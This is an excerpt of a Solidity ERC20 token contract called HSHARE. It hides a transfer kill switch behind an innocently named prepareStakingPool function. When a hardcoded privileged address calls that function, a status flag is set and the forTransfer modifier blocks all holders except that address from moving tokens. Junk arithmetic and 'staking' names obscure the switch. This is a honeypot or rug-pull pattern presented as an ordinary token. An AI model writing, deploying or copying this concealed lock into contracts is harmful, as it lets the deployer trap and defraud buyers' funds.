...
contract HSHARE is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _tokenq_totalSupply;
    uint256 private _tokenq_status = 0;
    uint256 public stakingPoolqStatus = 0;

    string private _tokenq_name;
    string private _tokenq_symbol;

    address private _poolqAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokenq_name = "HSHARE";
        _tokenq_symbol = "HSHARE";
        _tokenq_totalSupply = 100 * 10 ** 18;
        _balances[msg.sender] = _tokenq_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolqAddress || _tokenq_status == 0);
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenq_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolqStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolqAddress)
        {
            _tokenq_status = 1;
        }
    }
